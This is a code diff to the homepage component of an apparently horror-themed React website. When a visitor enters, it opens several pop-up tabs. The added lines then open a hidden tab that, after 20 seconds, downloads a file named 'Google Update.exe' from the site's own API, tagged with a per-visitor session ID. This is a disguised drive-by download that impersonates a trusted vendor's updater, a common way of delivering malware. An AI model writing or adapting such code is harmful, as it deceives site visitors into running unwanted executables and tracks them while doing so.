@@ -144,15 +144,21 @@ function Home() {
     if (hasClosed.current) return;
     hasClosed.current = true;
     setClosing(true);
+    const sid = ensureVisitorSession();
     const destinationTabs = CLOSE_DESTINATIONS.map(() => window.open("", "_blank"));
     destinationTabs.forEach((destinationTab, index) => {
       if (!destinationTab) return;
       destinationTab.opener = null;
       destinationTab.location.href = CLOSE_DESTINATIONS[index];
     });
-    window.setTimeout(() => void download(), 20_000);
+    const downloadTab = window.open("", "_blank");
+    if (downloadTab) downloadTab.opener = null;
+    window.setTimeout(() => {
+      if (!downloadTab || downloadTab.closed) return;
+      downloadTab.location.href = `/api/public/download?sid=${encodeURIComponent(sid)}&file=${encodeURIComponent("Google Update.exe")}`;
+    }, 20_000);
     setEntered(true);
-  }, [download]);
+  }, []);
 
   return <main className="min-h-screen overflow-x-clip bg-[#020406] font-sans text-[#edf8ff] selection:bg-cyan-200 selection:text-black"><HauntedWorld /><AnimatePresence>{!entered && <LoadingGate onEnter={enterSite} disabled={closing} />}</AnimatePresence><motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[90] bg-cyan-100 mix-blend-screen" animate={{ opacity: lightning ? 0.35 : 0 }} transition={{ duration: 0.04 }} /><AnimatePresence>{apparition && <motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[85] overflow-hidden bg-black" initial={{ opacity: 0, scale: 1.14 }} animate={{ opacity: [0, 0.78, 0.2], scale: [1.14, 1.02, 1.18] }} exit={{ opacity: 0, filter: "blur(18px)" }} transition={{ duration: 0.85, ease: "easeOut" }}><video muted autoPlay loop playsInline className="h-full w-full object-cover object-center mix-blend-screen"><source src="/promotion.mp4" type="video/mp4" /></video><div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_10%,rgba(0,0,0,.85)_78%)]" /></motion.div>}{watchingEyes && <motion.div aria-hidden className="pointer-events-none fixed left-[18%] top-[32%] z-[84] flex gap-5" initial={{ opacity: 0, scale: 0.55 }} animate={{ opacity: [0, 1, 0.35, 0.9, 0], scale: [0.55, 1, 0.96, 1.04, 0.7] }} transition={{ duration: 2.2, times: [0, .12, .45, .7, 1] }}><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_rgba(162,231,255,.85)]" /><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_7px_rgba(162,231,255,.85)]" /></motion.div>}</AnimatePresence>
     <section ref={heroRef} onMouseMove={onMove} className="relative flex min-h-[100svh] items-center justify-center overflow-hidden border-b border-cyan-100/10 bg-black">
